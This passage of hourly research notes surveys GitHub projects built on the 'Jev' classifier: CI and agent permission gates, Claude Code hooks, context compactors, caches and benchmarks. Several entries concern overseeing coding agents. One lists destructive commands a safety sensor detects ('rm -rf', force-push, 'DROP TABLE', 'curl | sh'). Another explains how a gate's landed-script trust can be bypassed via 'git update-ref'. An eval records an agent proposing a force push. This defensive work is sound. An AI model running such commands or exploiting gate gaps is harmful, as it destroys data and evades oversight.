   and unbounded `log_odds` (Kass–Raftery labels). Consensus
   `.sureness` = mean of the bounded metrics → bands
   **CERTAIN | CONFIDENT | LEANING | TORN | CLUELESS**.
   Thresholds are **opinions, not physics** — tune on your
   data. Example *theirs*: `{billing: 0.67, technical: 0.33,
   …}` → sureness **0.51** / **LEANING**.

   Reverse-engineer on 60 live answers *theirs*: **Choice
   `confidence == max_prob`** to 3 decimals on every answer
   (`(p_max − 1/n) / (1 − 1/n)`). Score is mostly `max_prob`
   except non-adjacent mass (e.g. `{0:0.20, 1:0.22, 2:0.58}`
   Jev conf **0.05** vs max_prob **0.37**) — extra spread
   penalty; they could not pin the formula from 30 points.
   Load-bearing: `max_prob` is the **most generous** metric.
   A 2-option 75/25 gets Jev confidence **0.5** and entropy
   **0.19**. Gating automation on Jev's number alone is a
   rosier story than the distribution supports. Pair with
   jev-ood-calibration (AUC ≠ ECE; do not threshold
   `confidence`) and does-jev-confidence (ranking ≠
   calibration). Complements dinostomp (instrument). Do not
   copy `pip install`.

   **Hunch / Augustus takeaway:** decision-theory toolbelt
   item — entropy/margin/gini as named features; the band is
   policy. Not a new model. Backend-agnostic over any
   probability vector (Choice/Score), not Jev-only.

5. **[`fstandhartinger/jevbench`](https://github.com/fstandhartinger/jevbench)**
   (Python; **MIT**; created 2026-09-19T07:07:36Z; 0★; pushed
   2026-09-19T08:32:52Z). Benchmark Heaven **JevBench v1.1** —
   unofficial, not TypeSafe. Harbor/jevals-shaped measurement
   practice, **not** a vendor eval and **not** a capability
   atlas (atlas is receipts-not-leaderboard; this is a scored
   bake-off that **keeps calibration out of the rank**).

   Three sub-benchmarks → one Main Score *theirs*
   (`0.6 × Capability + 0.2 × Speed + 0.2 × Cost`; sensitivity
   under five other weightings published). Capability = mean of
   three tier accuracies (easy 72 / standard 96 / judge 146 =
   **314**). **Calibration (Brier/ECE) is reported, not
   scored** — label-only systems have no distribution; verbalized
   LLM p ≠ native model distributions. Native vs verbalized
   labelled everywhere. Token logprobs unused. Partial runs
   shown and **not ranked**. v1.1 numbers never mixed with v1.0.

   Headline *theirs* (2026-09-19T08:32Z artifact): Jev 1.13.0
   Main **87.6** / Cap **97.8** (easy 100% / std 99.0% / judge
   94.5%) / p50 **0.65 s** / p95 **0.72 s** / **$0.0259** per
   1k. Capability-only ranking: GPT-5.6 Luna **98.2** leads Jev
   **97.8** by 0.4 — they call that inside the noise of Jev
   answering the suite twice. Needle 3 is a **function-calling
   model, not Jev-class** (label only; no manufactured Brier).
   242/314 is still a pilot (English, short cases; adequacy
   majority floor 82%; held-out is sent to the services —
   not-public ≠ not-seen). Do not copy CLI / key-env.

   **Hunch / Augustus takeaway:** jevals/Harbor practice —
   freeze the taskset, name native vs verbalized, keep
   calibration off the composite when the field is mixed,
   publish sensitivity, do not rank a partial run. Contrast
   atlas (hold/break receipts) and frontier-100 (attach the
   thinking budget; exploratory).

6. **[`NemanjaManic/ci-gatekeeper-bot-jev`](https://github.com/NemanjaManic/ci-gatekeeper-bot-jev)**
   (TypeScript + Shell; `package.json` **MIT** / GitHub SPDX
   **null** — no LICENSE file this pass; created
   2026-09-19T06:25:48Z; 0★; pushed 2026-09-19T08:45:04Z).
   GitHub Action: four typed questions (`should_review` /
   `risk` / `route` / `touches_secrets`) →
   `auto-approve | human-review | block`. Cheap typed gate
   **before** expensive LLM/human review. Repo config owns
   thresholds; conservative default
   `risk_threshold_for_review: cosmetic` **escalated trivial
   diffs to human-review in practice** (Jev often returned
   `risk: moderate` on docs). Secondary review only on
   `human-review` + elevated risk (observed ~4–5 s, ~5–10×
   Jev). Comment never includes raw diff, even on possible
   secrets. Statuses API not Checks.

   Measured *theirs* (own-repo, live Jev via Vercel AI Gateway):

   | scenario | route | Jev latency | Jev tokens in/out |
   |---|---|---:|---|
   | trivial docs | auto-approve* | 553 ms | 6798 / 120 |
   | CI permissions `write-all` | block | 612 ms | 743 / 117 |
   | fake credential-looking file | human-review | 629 ms | 737 / 118 |
   | mixed trivial + auth-shaped | human-review | 504 ms | 998 / 118 |

   Cousin of latch (merge-gate on a *finished* red run) — this
   is **pre-review triage**, not flaky-vs-real. Distinct from
   egma attention≠correctness. Do not copy `action.yml` /
   secrets / `AI_GATEWAY_API_KEY`.

   **Hunch:** VOI for human review on a PR stream; operator-
   owned criterion (same permission-vs-probability lesson as
   omp-greenlight). Conservative default is a feature, not a
   bug, until you measure your own base rate.

7. **[`teempai/jev-in-codex`](https://github.com/teempai/jev-in-codex)**
   (TypeScript; **MIT**; created 2026-09-19T08:32:15Z; 0★;
   GitHub `size` 0). Codex **MCP** host adapter. Experimental
   MVP. Three tools: `jev_select_capability` (rank a
   **caller-supplied** catalog; may recommend none),
   `jev_search` (rg shortlist → Jev rerank with paths/lines),
   `jev_triage` (saved artifact → original excerpts + exact
   duplicate groups + coverage). Codex supplies the objective
   and makes the final decision. Server does **not** execute
   capabilities, intercept arbitrary Codex tools, replace
   compaction, or see Codex's internal catalog.

   Ranking: independent Nouls, batched four, ≤24 candidates,
   8 s timeout, 28 kB cap, no retries. Capability recs need
   score ≥ **0.5** — **provisional heuristic, not calibrated**.
   Absent key / errors / invalid / failed batch → entire
   ranking falls to **lexical overlap** (local scores are not
   model probabilities; `method` / `fallback_reason` visible).
   Scores advisory in both modes. Ranking quality and
   time/token savings **have not been benchmarked**. 2026-09-19
   static security review: no confirmed reportable vulns; not
   a guarantee. Distinct from [nekowasabi/jev-routing](https://github.com/nekowasabi/jev-routing)
   (Go host adapter, **not MCP**) and from jev-sift (topology A
   MCP classify-first). Do not copy npm / `config.toml` /
   `TYPESAFE_API_KEY`.

   **Hunch:** extend the host-adapter catalog (Pi / Codex / …).
   MCP vs not-MCP is a transport fact, not a placement. Fail-
   open lexical is the same polarity as omp-jev-extensions.

### Skip / already folded

- skillranker / turnstile / atlas / frontier-100 /
  decision-combinators / ood-calibration / jevmlx: §66.
  This hour uses them only as sibling contrast (skill-broker)
  or pair (how-sure ↔ ood; jevbench ↔ atlas/frontier).
- skill-broker **outline**: §62. This hour adds the sibling
  table + README restatement; still not a recipe.
- latch merge-gate: §51. ci-gatekeeper is pre-review triage,
  not flaky-vs-real.
- jev-routing host adapter (not MCP): §44. jev-in-codex is
  the Codex MCP cousin.
- does-jev-confidence: §64. how-sure adds vector-level
  metrics and the Choice-confidence = max_prob receipt.

### Curated status

Census **this hour** (user-provided; not re-derived from
trackers here): Awesomejev **488/21644** unchanged; SemIf
**1683** (+11); jevlike **923** (+5); tracker likes **43**
(+1). Archer still **NOT landed**. X MCP flap continues.

### Omni / Jev-omni / Archer

Still **WATCH**. A TLA+ kernel, a coverage ledger, a sureness
library, a scored bake-off, a CI Action, and a Codex MCP
adapter are **not** that drop.

### Cross-links

Cards: `formal-methods.md` (TLA+ compose; never-confidently-
wrong; theater inverse); `applied-mappings.md` §3
(ci-gatekeeper), §5 (skill-broker sibling + Codex adapter),
§7 (SEAL advance/coverage); `mappings.md` §3 (jev-labs
circuit), §7 (sureness), §8 (SEAL / skill-broker siblings),
§10/§12 (protocol sandwich); `mixed-architecture.md` (fail
table + gallery); `validation.md` (jev-labs 1080 golden;
jevbench v1.1; how-sure 60-q); `faq.md`; `mental-models.md`;
`methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`; `composition-algebra.md`.
Hunches labeled. No wrapper.
## 68. Attention redirect not merge-blocker, pre-send views, tools≠use, observational memory, open-Jev class, physical-world S1 (2026-09-19 ~03:38 Boise)

Hourly System One watch **2026-09-19 03:38 America/Boise**
(≈ 09:38 UTC). Docs-only fold into PR #2. Watch archive
absent this VM; receipts from live GitHub READMEs + `gh api`
(~09:50 UTC). Hunches labeled. No wrapper. No invented
metrics. TypeSafe Jev is the exemplar, not the monopoly.
Archer still **NOT landed**.

Do **not** re-fold §67 HIGH (jev-labs, seal, skill-broker,
how-sure-is-jev, jevbench, ci-gatekeeper-bot-jev,
jev-in-codex) except one-line contrast.

Several titles on this hour's list already have cards.
This fold is **novel + material deltas only**:

| Repo | Prior | This hour |
|---|---|---|
| muse0509/jev-preflight | none | **new** Stop-hook attention redirect |
| dizk/jev-lens | none (rashedInt32/jev-lens is a *different* product, §63) | **new** pre-send view selection |
| willfish/pi-observational-memory-jev | none | **new** observational memory |
| genai-craft/openvons | none | **new** independent open-Jev class |
| AboveColin/HA-Jev | gallery row only | **first card**; ★17 physical-world S1 |
| godspede/construct-auto-classifier | §63 full cert | **delta:** landed-script trust; headless ≠ auto-approve |
| edwardyen724-g/jev-compactor | §65 64.5%/366ms vs Sonnet | **delta:** product-arm bench **73%** / 350 ms / 4 of 4; 30–250× cheaper |
| Dharundp6/jev-carryforward | §55 9×3 hint | **delta:** eval 0/4 recall; SessionStart > tools |
| kylemclaren/jevql | §42 store frame | **delta:** judgment *outside* the store (CLI; DB never sees extension) |
| bohutang/sift | §62 MED | **short bullet only** (~$0.00003/post) |

Four clusters, not a hit list: **(a)** judgment as
attention redirect, not a merge blocker; **(b)**
perception→decision token-econ (compress *before* first
send); **(c)** tools≠use / observational anti-summary
family; **(d)** backend-agnostic class + physical-world
crossover.

### HIGH

1. **[`muse0509/jev-preflight`](https://github.com/muse0509/jev-preflight)**
   (Go; **MIT**; created 2026-09-18T13:54:37Z; **1★**;
   size 84; v0.1.0 Public Beta). Claude Code **Stop-hook**
   risk preflight. `UserPromptSubmit` takes a private Git
   baseline; `Stop` sends a selected, redacted turn diff;
   **eight risk axes in one Jev request** (behavior
   regression, authorization, input validation, data
   integrity, error handling, compatibility, lifecycle,
   regression tests). Default `riskThreshold` **0.85 is
   uncalibrated**. Mode `assist`: at/above threshold,
   Claude gets **at most one** additional investigation,
   then finishes. Mode `report`: evaluate and finish.
   The plugin is **not an autofix or merge blocker** and
   does not replace tests, linters, SAST, or secret
   scanning. **Fails open**: network/timeout/invalid/
   oversized/missing key do not prevent Claude from
   finishing. At most one API request per Stop; empty or
   fully excluded diffs make zero requests. Redaction is
   best-effort, not DLP. Data leaves the machine to
   TypeSafe. Do not copy marketplace / plugin-option /
   `TYPESAFE_API_KEY`.

   Owner-run evidence *theirs* (`docs/verification.md`;
   Claude Code **2.1.267**; synthetic fixtures): no-key
   hook `no_key_fail_open=PASS`; key-enabled
   `continuation_check=PASS` with **exactly one** Jev
   feedback continuation then completion. Live API smoke
   (synthetic diff only): `jev-1.13.0`; eight Nouls
   present; 898 in / 151 out tokens; GET 1 / POST 1.
   Single-fixture axis values are diagnostics, **not**
   threshold calibration. Several hook fields remain
   UNOBSERVED (wire request counts, baseline, git
   cleanup). CI for the finalization commit had been
   pending at README freeze — do not invent a green
   marketplace pin.

   Contrast hard gates: latch / ci-gatekeeper / construct
   *authorize or block*; rashedInt32/jev-lens is a
   never-block **human** attention filter at Stop. This
   one redirects the **agent's** attention for one
   reinspect. Same polarity as skillranker hook fail-open
   (advisory) vs construct fail-closed (execution).

   **Hunch:** judgment as attention redirect, not a merge
   blocker. Uncalibrated 0.85 is an opinion until you
   measure your own false-continue vs false-reinspect
   costs.

2. **[`godspede/construct-auto-classifier`](https://github.com/godspede/construct-auto-classifier)**
   — **delta only** (full card §63). TypeScript;
   Apache-2.0; pushed 2026-09-19T09:05:15Z. Certification
   table **unchanged**: Jev **0** dangerous / 975;
   **$0.047/1k**; every chat model leaked 16–104 *theirs*.
   New load-bearing doctrine this hour:

   - **Landed-script trust.** A script byte-identical to
     the repo's remote default branch (`origin/main` or
     whichever remote has `HEAD`) may be allowed with
     **no model call** (`policy.trustLandedScripts`,
     default true). Comparison is against the *local*
     remote-tracking ref — it trusts whoever controls
     that remote, and anyone who can `git update-ref`.
     Turn it off when you do not control the remote.
     Unreviewed / modified / unpushed content still goes
     to the model with a provenance line.
   - **Headless ≠ auto-approve.** `policy.headless: true`
     (or `AUTO_CLASSIFIER_HEADLESS=1`) turns an
     escalation into a **denial that tells the agent to
     stop and report**, not a pending prompt and not an
     auto-approve. A prompt on a box with no operator is
     a prompt nobody answers. Two gates cannot share one
     OpenCode permission prompt.

   Harbor metaphor unchanged: certify the *whole gate*
   (fast rules + provenance + model), not the model
   alone. Do not copy bun / agy / opencode how-to.

   **Hunch:** privilege ≠ verdict still; landed-script is
   a *merge-gate receipt*, not a name. Headless fail-
   closed to deny, never to allow.

3. **[`edwardyen724-g/jev-compactor`](https://github.com/edwardyen724-g/jev-compactor)**
   — **delta** on the bench (architecture slogan already
   §65). TypeScript MIT; **1★**; pushed
   2026-09-19T09:27:52Z. **"Jev judges relevance. Code
   decides structure."** Foreman safety (`rm -rf`,
   force-push, `DROP TABLE`, `curl | sh`, leaked keys)
   in the **same ~300 ms pass** as keep/drop; regex floor
   still local. Dual polarity unchanged: compaction
   fail-open if Jev down; pending destructive/exfil
   fail-closed.

   Later product-arm bench *theirs* (same synthetic
   64-message / 12.7k-token session, 6k budget,
   `docs/BENCHMARK.md`):

   | arm | saved | latency | cost | facts |
   |---|---:|---:|---:|---|
   | **jev-compactor** | **73%** (53–76%) | **350 ms** | **$0.0004** | **4 of 4** |
   | Anthropic compaction API | 86% | 16.8 s | $0.043 | 3 of 4 |
   | Codex CLI `/compact` | 85% | 1.0 s | $0.049 | 3 of 4 |
   | OpenCode `/compact` | 85% | 17.4 s | $0.038 | 3 of 4 |
   | Gemini CLI `/compress` | 61% | 16.8 s | $0.083 | 4 of 4 |
   | Grok Build `/compact` | 74% | 0.5 s | $0.020 | 4 of 4 |
   | LangChain SummarizationMiddleware | 66% | 10.4 s | $0.013 | 1 of 4 |
   | Vercel `pruneMessages` (no model) | 88% | 1 ms | $0 | 3 of 4 |
   | oldest-first truncate | 53% | 1 ms | $0 | 1 of 4 |

   Summaries compress harder; that is the trade.
   jev-compactor kept every fact verbatim, **30–250×
   cheaper** and 1.4–170× faster than the model-based
   mechanisms *theirs*. 289-message / 61k-token session:
   95.4% / 593 ms / $0.0014 / 4 of 4 vs Anthropic API
   97.6% / 14.6 s / $0.145 / 3 of 4. Two synthetic
   sessions, not a survey. Earlier §65 vs-Sonnet card
   (64.5% / 366 ms) is the same session against a
   different control set — cite the product-arm table
   when comparing to shipped compactors. Do not copy
   npm / `.env`.

   **Hunch:** pointer-not-summarizer as middleware, now
   with a same-pass safety sensor and a Harbor-shaped
   *product* bake-off (not a TypeSafe leaderboard).

4. **[`dizk/jev-lens`](https://github.com/dizk/jev-lens)**
   (TypeScript; **MIT**; created 2026-09-18T08:16:12Z;
   0★; size 1876). **Not**
   [rashedInt32/jev-lens](https://github.com/rashedInt32/jev-lens)
   (§63: Stop-hook human attention filter). This one is
   **pre-send view selection of tool results**. Code
   builds candidate views from the output's own lines
   (outline / focus / signals / testlog / matches /
   tree / log / sample / sections / head / tail). Jev
   picks the smallest view that still serves the next
   step; nothing is generated or summarized. Agent can
   `recall` dropped lines. Three packages share one
   core: npm `jev-lens`, `pi-jev-lens`, Claude Code
   PostToolUse plugin.

   Measured *theirs* (STATUS.md; 500 OpenHands
   SWE-rebench trajectories; 3,300 large tool results;
   11.6M tokens): **79% fewer tokens** sent (11.6M →
   2.4M). Per kind: **88%** command output, 58% docs,
   47% listings, **31%** code. Own pi sessions with
   gpt-6-astra: 31% (reads code with `cat`, few tests).
   Harm side, same 500: **2 of 26** later edits missed
   their block; **0.3%** of results had a dropped line
   quoted; **2.2%** had a dropped identifier used. Three
   design results: (1) compress **before the first
   send** — post-send prune broke the prompt cache and
   cost **17% more** money; post-send pruning exists on
   pi but is off by default; (2) code is different —
   test logs can lose 90%; edits fail when old text is a
   line the model never saw, so code views keep retained
   lines byte-for-byte and code is sent in full unless
   Jev is confident; (3) new code-built views moved the
   numbers, prompt wording did not. Claude Code plugin
   runs the same core **unmeasured** on Claude sessions.
   Do not copy npm / marketplace / `.env`.

   **Hunch:** perception→decision token-econ. The
   irreversible act is *first send into the prompt
   cache*, not later prune. Distinct hole from rashed
   jev-lens (human VOI) and from jev-pruner (stdout after
   Bash, before the generative turn).

5. **[`Dharundp6/jev-carryforward`](https://github.com/Dharundp6/jev-carryforward)**
   — **delta** (verbatim ledger + scored recall already
   §55). TypeScript MIT; **1★**; npm `carryforward`.
   Constraints never scored. New eval finding *theirs*
   (`evals/` Claude plugin eval): payoff case needs a
   recorded "never force-push" rule; **with the tools
   available and the skill installed, the agent called
   `recall` 0 times out of 4 runs.** Not blocked, not
   erroring — never reached for. It proposed a force
   push. **An MCP tool sitting there is not enough.**
   SessionStart hook injects rules unconditionally at
   startup and after compact; that matters more than the
   tools. 9×3 table remains a hint, not proof. No
   accuracy claim until a proper use-test. Do not copy
   `claude mcp add` / hook JSON.

   **Hunch:** tools≠use. VOI of *installing* a memory
   tool is not VOI of *calling* it. Fail-open dump still
   the safe scoring polarity; the new failure mode is
   the model never asking.

6. **[`willfish/pi-observational-memory-jev`](https://github.com/willfish/pi-observational-memory-jev)**
   (TypeScript; **MIT**; created 2026-09-18T06:42:35Z;
   0★; size 104). Pi `/om`: Jev answers **keep/kind
   only**; compaction never rewrites the transcript.
   Model-free compact is a deterministic render of the
   verbatim ledger plus kind-keyed durable topics
   (`facts.md`, `decisions.md`, `constraints.md`,
   `questions.md`, `corrections.md`, `hypotheses.md`,
   `JOURNEY.md`). Jev cannot invent topic names.
   Tombstones land only after those files land, so a
   failed Jev call does not drain the buffer. Follows
   [amosblomqvist/pi-observational-memory](https://github.com/amosblomqvist/pi-observational-memory)
   ergonomics (do **not** install alongside — commands
   collide) and
   [tamaratran/fast-jev-compaction](https://github.com/tamaratran/fast-jev-compaction)
   keep/drop. Default `keepThreshold` 0.5. Package
   default **off**. Same anti-summary thesis as
   fast-jev-compaction / jev-compactor / carryforward.
   Do not copy `pi install` / `TYPESAFE_API_KEY` /
   settings.json.

   **Hunch:** observational memory is a *ledger +
   kind-keyed files*, not a summary paragraph. Jev is
   the observer, not a chat model in `models.json`.

7. **[`genai-craft/openvons`](https://github.com/genai-craft/openvons)**
   (Python; **Apache-2.0** in LICENSE / GitHub SPDX
   **NOASSERTION**; created 2026-09-17T09:13:00Z; **7★**;
   size 2044). Independent **open-Jev class**: finite
   choice + probability for LM / vision / voice. "None
   of the above" is always an option; calibrated mass
   splits execute / confirm / reject. Unrelated to
   TypeSafe; no TypeSafe API output is used. Speaks
   `POST /v1/systemone` (typesafe-sdk `base_url`
   drop-in) — **wire-compat, not a Jev replica**
   (same warning as jeff / jev-local / local-jev).

   Measured *theirs* (`docs/`):

   - LM: 4B frozen + trained head **0.916** vs 27B
     zero-shot **0.875**; 8 questions in **22.6 ms**.
   - Vision: frozen 407M encoder + ~25k-parameter head;
     beats 27B zero-shot at **1/34 VRAM** and **36×**
     speed.
   - Voice: batch candidate scoring + none-calibration;
     **50 ms**; 99–100% after calibration; **100%**
     rejection of phone chatter.
   - **JevPick** (menu decode, not a draft model): true
     continuation in the menu 90%; picker 88% vs 64%
     frequency rule; **3.2–4.8×** faster decode with
     **byte-identical** output (Qwen3-4B / Qwen3.8-27B).
   - Flutter on-device (Nothing Phone 3, NNAPI int8):
     **2.0–2.2 s** per utterance; **260–290 ms** to
     embed an image; **11 ms** to answer 9 questions.
     Audio/image stay on the phone.

   Contrast: jeff (GLiFormer encoder wire-compat);
   von (tiny SAN, not a replica); jevmlx (MLX softmax ≠
   Noul); Archer still Watch. Do not copy `uv` / demo
   URLs / APK as a vendor how-to.

   **Hunch:** Augustus scope is the *class* (finite
   choice + prob, NOTA, execute/confirm/reject), not
   TypeSafe's API. JevPick is a decode-speed
   application of the same menu idea, not a Noul.

8. **[`AboveColin/HA-Jev`](https://github.com/AboveColin/HA-Jev)**
   (Python; **MIT**; created 2026-09-17T11:01:48Z;
   **17★**; size 2521). First real card (was a gallery
   stub). Home Assistant: typed answers become sensors;
   four actions (`jev.noul` / `jev.choice` / `jev.score`
   / `jev.ask`); conversation agent for Assist;
   confidence gating; daily token budget. Fifteen
   examples; four pair Jev with an LLM (cheap typed
   gate → expensive call; low-conf cascade; LLM writes,
   Jev checks; extract then verify). **Not for locks,
   heaters, or smoke alarms** — a probability with no
   explanation should not hold a safety actuator.
   Jev judges, does not calculate: brightness comes
   from a regex. `background:` on the *question* triples
   laundry idle/running separation (+0.21 readings-only
   → +0.60) *theirs*; putting the same sentence in
   state is about half as useful. Batching: 3 questions
   712 ms vs 100 questions 714 ms (97 more cost 2 ms).
   NL warm 250–580 ms (published 70–500 ms is nearer
   their service). 30 live commands on a 5-entity
   fixture: **$0.0017** total / **$0.000057** each;
   ~1,300 tokens of question text dominate a small
   house. Confidence has **no published calibration
   evidence** — treat 0.9 as higher than 0.6, not as
   right nine times in ten. 192 tests mock the API.
   Do not copy HACS / API-key / configuration.yaml.

   **Hunch:** physical-world System One. Sensors from
   typed answers; automations and device I/O stay in
   Home Assistant. Same mixed-architecture split as
   Jev-gates-LLM at the desk, now on a washing machine.

9. **[`kylemclaren/jevql`](https://github.com/kylemclaren/jevql)**
   — **architecture note**, not a re-read of §42. Go;
   **MIT**; **4★**. Semantic SQL over **vanilla
   Postgres**: `jev()` / `jev_prob` / `jev_choice` /
   `jev_score` in WHERE/SELECT. **The database only ever
   sees ordinary SQL.** CLI (or `jevql serve` / MCP /
   Go·TS·Python SDKs) judges; no `CREATE EXTENSION`, no
   superuser, no wire-protocol proxy. Contrast
   [`realZachi/pg-jev`](https://github.com/realZachi/pg-jev)
   (in-engine). Full scan of the post-SQL-filter row
   set; cheap indexed predicates first; `--explain`
   counts before you pay. Row contents go to TypeSafe.
   Do not copy `DATABASE_URL` / API keys.

   **Hunch:** judgment outside the store. The data plane
   for a decision model can be a rewriter in front of a
   dumb database; putting `jev()` *inside* Postgres is a
   different trust and ops story (sqlite-jev / pg-jev).

10. **[`bohutang/sift`](https://github.com/bohutang/sift)**
    — **short use-case only** (already §62 MED).
    JavaScript MIT; **2★**; 4 forks. Chrome extension:
    every X post/reply gets Substance · Humor ·
    Chit-chat · Promo · Junk plus AI-written and
    Off-topic flags; hide the ones you don't want.
    **~$0.00003/post** *theirs*. Minimal consumer
    categorization surface. Cousin of x-reply-filter
    (that one is local-rules-then-remainder + anti-self-
    train). Do not copy unpacked-extension how-to.

### Skip / already folded

- §67 HIGH: jev-labs / seal / skill-broker / how-sure /
  jevbench / ci-gatekeeper / jev-in-codex. Contrast only:
  preflight is fail-open attention, not a typed CI gate;
  construct landed-script is not a Seal.
- rashedInt32/jev-lens + nvim: §63. dizk/jev-lens is a
  different product (pre-send views vs human Stop
  filter). Always qualify the owner.
- fast-jev-compaction / pi-jev-compaction /
  fast-jev-compaction-pi / gliner25-compaction /
  jev-pruner: anti-summary family already mapped; pi-om
  is the observational-memory sibling.
- jevql store frame / sqlite-jev / pg-jev: §42. This
  hour is the outside-the-store slogan.

### Curated status

Census **this hour** (user-provided; not re-derived):
Awesomejev **488 → 561** (+73, especially agent tooling
**87 → 107**); SemIf **1683 → 1704**. Archer still
**NOT landed**.

### Omni / Jev-omni / Archer

Still **WATCH**. An open-Jev class with voice/vision
heads, a Home Assistant integration, and a Flutter
on-device pipeline are **not** that drop.

### Cross-links

Cards: `applied-mappings.md` §1 (dizk/jev-lens pre-send;
pi-om; carryforward 0/4; jev-compactor 73%), §3
(jev-preflight), §4 (sift bullet), §7 (construct
landed-script / headless); `mappings.md` §4 (jevql
outside the store), §6 (tools≠use), §7 (HA-Jev SDT),
§8 (headless ≠ auto-approve); `mixed-architecture.md`
(fail table + gallery); `judgment-class.md` (openvons
wire-compat class); `mental-models.md` (physical-world
S1; tools≠use; attention redirect); `validation.md`
(dizk 79%; jev-compactor product arms; construct
deltas); `faq.md`; `agent-self-assessment.md`;
`toolbox-mapping.md`; `methods-catalog.md`. Hunches
labeled. No wrapper.

## 69. Digital-design combinators, VOI cache, skill-routing Harbor harness, zeroshot displacement, typed handoff (2026-09-19 ~04:39 Boise)

Hourly System One watch **2026-09-19 04:39 America/Boise**
(≈ 10:39 UTC). Docs-only fold into PR #2. Watch archive
absent this VM; receipts from live GitHub READMEs + `gh api`
+ Hugging Face (~10:55 UTC). Hunches labeled. No wrapper.
No invented metrics. TypeSafe Jev is the exemplar, not the
monopoly. Archer still **NOT landed**.

Do **not** re-fold §68 HIGH (jev-preflight, construct
landed-script, jev-compactor 73%, dizk/jev-lens,
carryforward 0/4, pi-om, openvons, HA-Jev, jevql, sift)
except sibling contrast. Combinators this hour are a
**rename + extended algebra**, not a second library.

| Signal | Prior | This hour |
|---|---|---|
| voidning/decision-combinators | §66 core five | **renamed** voidning/jev-combinators; extended five; digital-design slogan |
| kevinpita/winnow | launch-week context sieve | **distinct** ThinkyMiner/Winnow (worth-your-attention VOI) |
| skillranker / skill-broker / jev-in-codex | §66–§67 routing | **new** BM25 vs Jev Harbor harness + Pi strip-roster |
| openvons / jeff / jev-local | wire-compat class | **new** IamBusy/OpenJev `/v1/decide`; semif-serve SemIf runoff |
| rashedInt32/jev-lens | human Stop VOI | cousin: ThinkyMiner Winnow (human feed) |
| dizk/jev-lens / jev-compactor | pre-send / compact | cousin: hermes-jev-router WHETHER/HOW/WHAT |
| wakegate | same author | sibling: jev-handoff typed baton |
| INSTRUCT_JEV | §63 seed | sibling: DGUI_HYPERMEM-JEV flywheel (6 rows) |
| rh-guard | reward-hack | **owns** that angle; security-scan / jev-decisions / TeoMastro are toolbelt notes |

Seven clusters, not a hit list: **(a)** digital-design
combinators (rename + extend); **(b)** VOI admission /
cache / attention (jevcache, Winnow, hermes-router);
**(c)** Harbor/jevals routing + displacement (skill-bench,
zeroshot-vs-bert); **(d)** mixed-arch control plane
(handoff, browser-jev); **(e)** epistemic conflict ≠
ignorance (typed-evaluation-collapse); **(f)** local class
+ omni cross-ref (OpenJev, semif-serve); **(g)** toolbelt
notes + flywheel dataset.

### HIGH

1. **[`voidning/jev-combinators`](https://github.com/voidning/jev-combinators)**
   — **rename + delta** (core five already §66 as
   `voidning/decision-combinators`). GitHub now returns
   `full_name` jev-combinators for the old URL (same
   `created_at` 2026-09-19T07:25:16Z). TypeScript; package
   MIT / GitHub SPDX null; size **31** (was 0); npm
   `jev-combinators` 0.1.0. Slogan: **"Primitives are
   transistors. Combinators are logic gates. You design
   the chip."** Mental model: digital design for *soft*
   classifiers (AND/OR/NOT/threshold as *metaphor*).
   Core five still Then / Gate / Vote / Cascade / Weighted.
   **Extended five:** Router (branch on Choice value) /
   Loop (repeat until satisfied) / Retry (try alternatives)
   / Fallback (deterministic backup; fail-closed
   safety-critical) / Memory (gate what to remember).
   Works with TypeSafe + LitJev / OpenJev / System One
   Lite / any `POST /v1/systemone`. Trace is the
   oscilloscope. No measurements. Composition-algebra
   still: **not** literal independent AND/OR — do not
   multiply parallel Nouls. Router/Loop/Retry/Fallback/
   Memory are **control-plane** nodes, not Boolean
   operators. Do not copy npm.

   **Hunch:** System One as a chip, not chat turns. The
   rename is the digital-design slogan plus five more
   gates, not a second algebra.

2. **[`kushals256/jevcache`](https://github.com/kushals256/jevcache)**
   (TypeScript; **MIT**; created 2026-09-19T09:40:18Z;
   0★; size 57). OpenAI-compatible proxy: **"Routers pick
   a model. jevcache decides whether to call one."**
   Policy bypass (stream / tools / multimodal / volatile);
   exact SHA-256 of the canonical request (per model +
   system prompt); Jev `same_intent` + pick a candidate;
   miss → upstream LLM → store; **fail-open** (Jev error
   still calls upstream). Live eval `results/eval.json`
   *theirs* n=100: Jev **fp=0 / precision=1 / recall=0.38
   / fpr=0** vs cosine-Jaccard@0.35 **fp=24 / fpr=0.48**;
   `jev_cost_usd` **0.00174**. Not in v0: streaming HITs,
   tool-call caching. Do not copy npx / docker / `.env`.

   **Hunch:** econ/VOI admission controller. Same-intent
   is a typed gate in front of an expensive generator,
   not a cosine cache. Zero false positives on their
   fixture is the operating-point claim; recall 0.38 is
   the price of that conservatism.

3. **[`iamdin/pi-jev-skill-bench`](https://github.com/iamdin/pi-jev-skill-bench)**
   + **[`iamdin/pi-jev-skill-suggestion`](https://github.com/iamdin/pi-jev-skill-suggestion)**
   (both TypeScript; **MIT**; 0★). Bench created
   2026-09-19T10:25:30Z; GitHub size 0 but files live
   (`cases.jsonl` **43** gold). Experiment harness, not a
   production claim. Token/USD = `chars/4` assumptions.
   Roster tiers **50 / 100 / 200 / 500** (every labelled
   skill always included, then seeded fill). Axes: exact
   hit / none_hit / wrong_skill / false_load / miss;
   categories clear / near-miss / quiet / adversarial.
   **No published live Jev bench numbers this pass.**

   Suggestion: strip `<available_skills>`; two-stage
   (mean of three Nouls, quiet below **0.30**) → chunked
   Choice ≤254 + `none_of_these` → shortlist 3 → fits
   Noul **0.40**; timeout/API error **fail-open**; **no
   key → no-op** (Pi keeps listing). Tool mode hopes the
   agent calls `skill_suggest`; auto mode runs every user
   prompt. Contrast skillranker (advisory VOI; hook
   fail-open) / skill-broker (grants in code) / jev-in-codex
   (caller catalog). **tools≠use cousin:** tool mode
   still depends on the agent reaching for the tool.
   Harbor/jevals comparative harness for *toolbelt
   routing*. Do not copy `pi install` / bun how-to.

   **Hunch:** roster size is the independent variable.
   BM25 vs Jev is the bake-off, not "Jev wins routing."
   Cite only after `out/results-*.md` exists.

4. **[`zhuyansen/jev-zeroshot-vs-bert`](https://github.com/zhuyansen/jev-zeroshot-vs-bert)**
   (Python; **MIT**; created 2026-09-19T10:29:44Z; 0★;
   GitHub size 0, README + results live). Jev vs
   BERT-family zero-shot on six public tasks plus post-
   release arXiv as contamination control. Cite *theirs*.
   Jev beats clean DeBERTa-c on **all 7** eval sets
   (paired bootstrap CIs above 0): **+0.05 to +0.13** acc
   on the benches; PAWS AUC **+0.03**; arXiv 2026 **+0.30**.
   Contaminated `nli-deberta` AG News **0.901** vs clean
   `-c` **0.763** — they use `-c` as the baseline.
   Label-equivalence (conservative = smaller of two
   trained curves): Jev zero-shot ≈ **~230 labels** on AG
